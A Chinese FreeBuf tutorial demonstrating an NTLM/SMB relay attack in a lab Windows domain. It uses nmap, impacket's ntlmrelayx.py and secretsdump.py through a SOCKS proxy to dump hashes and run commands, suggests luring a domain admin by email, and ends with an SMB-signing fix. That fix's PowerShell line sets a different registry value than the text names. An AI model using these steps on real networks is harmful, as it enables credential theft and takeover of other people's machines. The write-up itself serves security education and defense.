***本文原创作者：R1ngk3y，本文属FreeBuf原创奖励计划，未经许可禁止转载**  

## 前言

**smb中继或叫smb请求重放攻击，B是一个smb服务器，A来进行认证，B将A的认证信息转发到C上，如果A的凭证在C上认证成功就能进行下一步操作，如创建服务执行命令。如果在域中控制了某些常用服务，如：WEB
OA系统、文件共享等服务则可以尝试使用SMB中继攻击来引诱域管理员访问达到获取其他机器权限的目的。**

## ![30.png](https://image.3001.net/images/20180703/15306128647981.png!small)
**环境**

> 192.168.123.10 win 7 域管理员(administrator)机器
>
> 192.168.123.11 kali linux 攻击者机器
>
> 192.168.123.100 域内普通用户-受害者机器

##  **攻击演示**

需要smb签名关闭下才能进行利用，只有windows server的smb签名是默认开启的，像Windows 7的签名默认关闭

可以用nmap探测smb是否关闭

    
    
    nmap --script smb-security-mode.nse -p445 192.168.123.0/24 --open

![1.png](https://image.3001.net/images/20180630/15303386031011.png!small)
下载impacket工具包

    
    
    git clone https://github.com/CoreSecurity/impacket.git

192.168.123.11（攻击者机器） 执行  

    
    
    ntlmrelayx.py -tf hosts.txt -socks -smb2support

hosts.txt里面的内容是要进行中继的IP，机器越多成功率越高，我这里只有一个IP

![2.png](https://image.3001.net/images/20180630/15303387305015.png!small)

然后让192.168.123.10(域管理员机器)
访问192.168.123.11(攻击者机器)的共享,可以架设一个web服务器，html页面里嵌入\\\攻击者地址，我这里为了方便演示就在本地写一个html

![3.png](https://image.3001.net/images/20180630/15303387892158.png!small)

192.168.123.10(域管理员机器)访问共享时，提示如下说明中继成功

![4.png](https://image.3001.net/images/20180630/153033884387.png!small)

    
    
    [*] Authenticating against smb://192.168.123.100 as Z3R0\Administrator SUCCEED  
     [*] SOCKS: Adding Z3R0/ADMINISTRATOR@192.168.123.100(445) to active SOCKS connection. Enjoy  
    

然后在本地会创建一个socks4代理

在 /etc/proxychains.conf 的最后一行填入

    
    
    socks4 	192.168.123.11 1080

配置好socks4代理后攻击者执行

    
    
    proxychains python secretsdump.py z3r0/Administrator@192.168.123.100

这样secretsdump.py发送出的认证数据包经过socks4代理中继就能成功进行认证![5.png](https://image.3001.net/images/20180630/1530339187916.png!small)

如果不加上其他参数的话ntlmrelayx.py默认会dumphash

![6.png](https://image.3001.net/images/20180630/15303392124905.png!small)

先看看视频效果图

上传时 freebuf提示图片超出大小限制（希望小编能处理下:) ），效果图地址：<http://ringk3y.com/wp-content/uploads/2018/06/1.gif>

##  **原理分析**

每一步smb请求都被192.168.123.11(攻击者机器)转发到了其他机器上

![7.png](https://image.3001.net/images/20180630/15303394102671.png!small)1\.
192.168.123.10(域管理员机器)向192.168.123.11(攻击者机器)商量smb协议版本

![8.png](https://image.3001.net/images/20180630/15303394615138.png!small)

2\. 192.168.123.11(攻击者机器)向192.168.123.100(受害者机器)商量smb协议版本

3.192.168.123.100(受害者机器)向192.168.123.11(攻击者机器)回答支持smb v2

![9.png](https://image.3001.net/images/20180630/15303394931629.png!small)
4.192.168.123.11(攻击者机器)向192.168.123.10(域管理员机器)回答支持smb v2  

协商完就开始认证了

![10.png](https://image.3001.net/images/20180630/15303395191511.png!small)
1.192.168.123.10(域管理员机器)向192.168.123.11(攻击者机器)发出NTLMSSP_NEGOTIATE认证协商请求

2.192.168.123.11(攻击者机器)向192.168.123.100(受害者机器)发出NTLMSSP_NEGOTIATE认证协商请求

3.192.168.123.100(受害者机器)向192.168.123.11(攻击者机器)进行响应，响应包里含有challenge

![11.png](https://image.3001.net/images/20180630/15303395472461.png!small)
4.同样192.168.123.11(攻击者机器)向192.168.123.10(域管理员机器)进行响应，响应包里含有challenge

5.192.168.123.10(域管理员机器)收到challenge后用hash将challenge加密,作为NTLM
Response字段发送给192.168.123.11(攻击者机器)

![12.png](https://image.3001.net/images/20180630/15303395779528.png!small)6.同样，192.168.123.11(攻击者机器)将域管理员的认证请求也发往192.168.123.100(受害者机器)  

![13.png](https://image.3001.net/images/20180630/15303396061852.png!small)在响应包中可以看到已经认证成功了  

![14.png](https://image.3001.net/images/20180630/1530339640755.png!small)有了管理员权限就能为所欲为了  

![16.png](https://image.3001.net/images/20180630/15303396685193.png!small)
因为没有目标机器密码所以不能进行正常的smb认证，ntlmrelayx脚本的socks4代理作用就是处理本地发往192.168.123.100
(受害者机器)流量起一个中继作用，因为已经认证过了就不用再进行认证，密码随便填一个就行，使用socks4代理时的smb的身份认证是域管理员。

可以通过创建服务来执行命令,当然ntlmrelayx.py也可以做到.

    
    
    python ntlmrelayx.py -tf hosts.txt -c 'cmexe /c calc.exe'

![18.png](https://image.3001.net/images/20180630/15303397737280.png!small)当192.168.123.10(域管理员机器)再次访问共享时，192.168.123.100(受害者机器)上可以看到calc已经运行了

![17.png](https://image.3001.net/images/20180630/15303397176898.png!small)

##  **总结**

1.可以通过给域管理员发送邮件的方式来让他触发smb请求

2.当然如果域管理员触发了smb中继请求了也可以针对他所在那一台机器做中继，这样就能执行命令抓lsass.exe进程中的明文密码了

##  **修复建议**

将注册表项"RequireSecuritySignature"设置为 1 可以启用 SMB 签名

powershell执行

    
    
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" RequireSecureNegotiate -Value 1 –Force

 ***本文原创作者：R1ngk3y，本文属FreeBuf原创奖励计划，未经许可禁止转载**  

